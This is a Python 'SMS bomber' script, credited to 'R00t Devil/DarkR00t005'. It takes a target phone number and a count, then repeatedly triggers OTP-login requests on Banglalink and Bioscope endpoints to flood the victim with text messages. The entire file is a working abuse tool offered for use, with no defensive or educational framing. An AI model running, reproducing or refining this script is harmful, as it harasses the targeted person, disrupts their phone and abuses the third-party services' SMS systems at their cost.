import requests as rq
import time
banner = ('''


\033[1;31m______________  _______  __________   \033[32m________                 ______              
\033[1;31m__  ____/__  / / /__  / / /_  ____/   \033[32m___  __ )____________ ______  /______________
\033[1;31m_  / __ __  /_/ /__  /_/ /_  /       \033[32m __  __  |  __ \_  __ `__ \_  __ \  _ \_  ___/
\033[1;31m/ /_/ / _  __  / _  __  / / /___     \033[32m _  /_/ // /_/ /  / / / / /  /_/ /  __/  /    
\033[1;31m\____/  /_/ /_/  /_/ /_/  \____/      \033[32m/_____/ \____//_/ /_/ /_//_.___/\___//_/     
                                                 
                                                           \033[1;37mCoded by=>>>R00t Devil/DarkR00t005                                                                          

''')
print(banner)


number  = str(input("\033[1;37m[>] Enter The Phone Number: "))
print(" ")
amount = int(input("\033[1;37m[>] Enter The Thread Ammount: "))
print(" ")
print("\033[36mFinding API's for the Operator")
time.sleep(2)
print(" ")
print("\033[36mAPI's Successfully Fetched")
time.sleep(2)
print(" ")

sent, nsent = 0, 0

for count in range(1, amount + 1):
  try:
    status = 0
    if number.startswith("014") or number.startswith("019"):
      print("\033[32mMesseage Request has been sent for the target number!") 
      r = rq.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": number})
      status = r.status_code
        
    else:
      print("\033[32mMesseage Request has been sent for the target number!")
      url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"
      r = rq.get(url)
      status = r.status_code
    
    if status == 200:
      print(f"[✓] {count} SMS Sent.")
    time.sleep(1)
    sent += 1
    count += 1

  except:
      print(f"[×] {count} SMS Not Sent.")
      time.sleep(10)
      count+=1

  count += 1             
            
totalhit  = amount
nsent     = totalhit - sent

print(f"\033[36m[•] Total Hits : {totalhit}")
print(f"\033[36m[✓] Total Sent : {sent}")
print(f"\033[36m[×] Total Not Sent : {nsent}")
